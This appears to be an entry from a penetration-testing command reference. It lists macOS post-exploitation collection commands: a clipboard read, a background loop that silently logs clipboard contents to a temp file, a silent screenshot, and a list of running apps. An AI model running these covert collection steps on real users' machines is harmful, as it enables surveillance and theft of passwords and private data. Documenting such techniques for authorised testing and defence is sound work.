---
description: |
  Capture clipboard contents, monitor for changes, take screenshots, and enumerate running applications on macOS for post-exploitation intelligence gathering.
command: |
  # Read clipboard
  pbpaste

  # Monitor clipboard changes
  while true; do pbpaste; echo "---"; sleep 2; done > /tmp/clipboard.log &

  # Screenshot
  screencapture -x /tmp/screen.png

  # List running apps
  osascript -e 'tell application "System Events" to get name of every process whose background only is false'
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - macOS
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation
  - https://ss64.com/mac/pbpaste.html
---
